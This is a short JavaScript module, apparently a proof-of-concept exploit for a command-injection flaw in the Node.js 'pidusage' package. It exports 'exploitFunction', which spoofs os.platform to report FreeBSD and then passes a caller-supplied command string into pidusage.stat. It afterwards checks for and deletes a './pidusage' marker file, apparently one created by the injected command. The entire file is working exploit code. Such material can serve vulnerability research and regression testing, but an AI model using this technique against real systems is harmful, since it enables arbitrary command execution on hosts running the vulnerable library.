function exploitFunction(command) {
  const os = require("os");
  os.platform = () => {
    return "freebsd";
  };
  const roar_pidusage = require("pidusage");
  const fs = require("fs");
  const path = "./pidusage";

  roar_pidusage.stat(command, function () {
    const file_exist = fs.existsSync(path);
    fs.unlink(path, function (err) {
      if (err) throw err;
    });
  });
}

module.exports = { exploitFunction };